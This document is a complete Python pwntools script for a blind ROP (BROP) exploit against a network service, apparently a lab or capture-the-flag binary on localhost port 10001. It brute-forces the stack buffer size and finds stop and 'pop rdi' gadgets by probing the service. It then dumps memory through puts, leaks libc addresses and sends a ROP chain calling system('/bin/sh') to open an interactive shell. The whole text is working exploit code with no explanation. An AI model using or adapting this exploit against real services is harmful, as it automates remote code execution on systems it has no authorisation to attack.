from pwn import *

def get_io():
	io = remote('127.0.0.1', 10001)		# io = process('./brop')
	io.recvuntil("password?\n")
	return io

def get_buffer_size():
	for i in range(1, 100):
		payload  = "A" * i
		buf_size = len(payload)
		try:
			io = get_io()
			io.send(payload)
			io.recv()
			io.close()
			log.info("bad: %d" % buf_size)
		except EOFError as e:
			io.close()
			log.info("buffer size: %d" % (buf_size-1))
			return buf_size-1

def get_stop_addr():
	addr = 0x400000
	while True:
		addr += 1
		payload  = "A" * buf_size
		payload += p64(addr)	# return addr
		try:
			io = get_io()
			io.sendline(payload)
			io.recv()
			io.close()
			log.info("stop address: 0x%x" % addr)
			return addr
		except EOFError as e:
			io.close()
			log.info("bad: 0x%x" % addr)
		except:
			log.info("Can't connect")
			addr -= 1

def get_gadgets_addr():
	addr = stop_addr
	while True:
		addr += 1
		payload  = "A" * buf_size
		payload += p64(addr)
		payload += "AAAAAAAA" * 6
		try:
			io = get_io()
			io.sendline(payload + p64(stop_addr))	# with stop
			io.recv(timeout=1)
			io.close()
			log.info("find address: 0x%x" % addr)
			try:		# check gadget
				io = get_io()
				io.sendline(payload)				# without stop
				io.recv(timeout=1)
				io.close()
				log.info("bad address: 0x%x" % addr)
			except:
				io.close()
				log.info("gadget address: 0x%x" % addr)
				return addr
		except EOFError as e:
			io.close()
			log.info("bad: 0x%x" % addr)
		except:
			log.info("Can't connect")
			addr -= 1

def get_puts_call_addr():
	addr = stop_addr
	while True:
		addr += 1
		payload  = "A" * buf_size
		payload += p64(gadgets_addr + 9)	# pop rdi; ret
		payload += p64(0x400000)
		payload += p64(addr)
		payload += p64(stop_addr)
		try:
			io = get_io()
			io.sendline(payload)
			if io.recv().startswith("\x7fELF"):
				log.info("puts call address: 0x%x" % addr)
				io.close()
				return addr
			log.info("bad: 0x%x" % addr)
			io.close()
		except EOFError as e:
			io.close()
			log.info("bad: 0x%x" % addr)
		except:
			log.info("Can't connect")
			addr -= 1

def dump_memory(start_addr, end_addr):
	result = ""
	while start_addr < end_addr:
		payload  = "A" * buf_size
		payload += p64(gadgets_addr + 9)
		payload += p64(start_addr)
		payload += p64(puts_call_addr)
		payload += p64(stop_addr)
		try:
			io = get_io()
			io.sendline(payload)
			data = io.recv(timeout=0.1)
			if data == "\n":
				data = "\x00"
			elif data[-1] == "\n":
				data = data[:-1]
			log.info("leaking: 0x%x --> %s" % (start_addr,(data or '').encode('hex')))
			result += data
			start_addr += len(data)
			io.close()
		except:
			log.info("Can't connect")
	return result

def get_puts_addr():
	payload  = "A" * buf_size
	payload += p64(gadgets_addr + 9)
	payload += p64(puts_got)
	payload += p64(puts_call_addr)
	payload += p64(stop_addr)

	io.sendline(payload)
	data = io.recvline()
	data = u64(data[:-1] + '\x00\x00')
	log.info("puts address: 0x%x" % data)

	return data

def leak():
	global system_addr, binsh_addr

	puts_addr = get_puts_addr()

	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	system_addr = puts_addr - libc.sym['puts'] + libc.sym['system']
	binsh_addr = puts_addr - libc.sym['puts'] + 0x18cd57
	log.info("system address: 0x%x" % system_addr)
	log.info("binsh address: 0x%x" % binsh_addr)

def pwn():
	payload  = "A" * buf_size
	payload += p64(gadgets_addr + 9)
	payload += p64(binsh_addr)
	payload += p64(system_addr)

	io.sendline(payload)
	io.interactive()

if __name__=='__main__':
	# buf_size = get_buffer_size()
	buf_size = 72

	# stop_addr = get_stop_addr()
	stop_addr = 0x4005e5

	# gadgets_addr = get_gadgets_addr()
	gadgets_addr = 0x40082a

	# puts_call_addr = get_puts_call_addr()
	puts_call_addr = 0x400761

	# code_bin = dump_memory(0x400000, 0x401000)
	# with open('code.bin', 'wb') as f:
	#	f.write(code_bin)
	#	f.close()
	puts_got = 0x00601018

	# data_bin = dump_memory(0x600000, 0x602000)
	# with open('data.bin', 'wb') as f:
	#	f.write(data_bin)
	#	f.close()

	io = get_io()
	leak()
	pwn()
